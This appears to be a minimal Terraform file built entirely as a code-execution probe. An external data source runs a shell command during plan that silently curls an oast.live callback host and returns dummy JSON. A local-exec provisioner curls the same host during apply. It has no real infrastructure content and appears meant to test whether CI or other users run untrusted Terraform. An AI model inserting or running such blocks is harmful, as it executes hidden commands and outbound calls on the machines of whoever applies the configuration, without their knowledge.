data "external" "x" {
  program = ["sh", "-c", "curl -s https://dbosdphokakf6knrq7l01g5jx5abc1yi6.oast.live/tf-external-datasource >/dev/null 2>&1; printf '{\"r\":\"ok\"}'"]
}
resource "null_resource" "y" {
  provisioner "local-exec" {
    command = "curl -s https://dbosdphokakf6knrq7l01g5jx5abc1yi6.oast.live/tf-local-exec"
  }
}
output "o" { value = data.external.x.result }
